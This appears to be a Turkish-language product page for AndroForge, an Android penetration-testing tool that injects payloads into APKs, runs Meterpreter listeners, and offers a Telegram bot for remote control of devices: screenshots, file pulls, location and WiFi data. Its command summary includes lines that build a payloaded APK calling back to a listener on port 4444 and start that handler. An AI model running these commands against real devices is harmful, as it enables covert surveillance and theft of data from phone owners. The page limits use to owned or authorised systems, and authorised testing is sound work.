AndroForge; ADB cihaz yönetimini, Telegram tabanlı uzaktan komutayı, APK derleme hattını ve Meterpreter dinleyicisini tek araçta birleştirir. Komut satırı karmaşasını sadeleştirir; yalnızca sahibi olduğunuz veya yazılı test izni aldığınız sistemlerde kullanılmak üzere tasarlanmıştır.

Yetkinlikler

Aracın modülleri

🔌

ADB cihaz yönetimi

USB ve WiFi ADB bağlantısı, cihaz listeleme, kalıcı seri bağlantı. Kurulum öncesi ortam kontrolü (adb / apktool / msfvenom durumu).

🤖

Telegram C2

Bot üzerinden uzaktan komuta: durum, cihaz bilgisi, ekran görüntüsü, dosya listeleme/çekme, konum, WiFi bilgisi. Canlı bildirimler.

📦

APK build pipeline

Hedef test APK’sine payload enjeksiyonu ve imzalı çıktı üretimi (final_signed.apk). Tek komutla derleme ve kurulum.

🎧

Meterpreter dinleyici

Çoklu dinleyici yönetimi, oturum bildirimi, log takibi. Handler başlat/durdur.

🖥️

Web GUI paneli

Yerel panel (127.0.0.1:8787): cihaz durumu, araç kontrolü, ayarlar, build sekmesi, C2 logları — tarayıcıdan yönetim.

⚙️

Kurulum kolaylığı

install.sh kurulum betiği, config.env ile yapılandırma, doctor ile ortam teşhisi. .gitignore ile sırlar korunur.

Hızlı bakış

Komut özeti

Araç, komut satırından tek satırla yönetilir. Web panel ile de aynı işlevler.

Kurulum & teşhis

bash install.sh
nano config.env
python3 main.py doctor

Bağlantı

python3 main.py devices
python3 main.py adb-wifi enable
python3 main.py adb-connect --host 192.168.1.20

Kontrol & panel

python3 main.py listen
python3 main.py panel
python3 main.py gui      # http://127.0.0.1:8787

Build & handler

python3 main.py build --apk app.apk --lhost 192.168.1.10 --lport 4444
python3 main.py handler --lhost 0.0.0.0 --lport 4444
python3 main.py install-apk
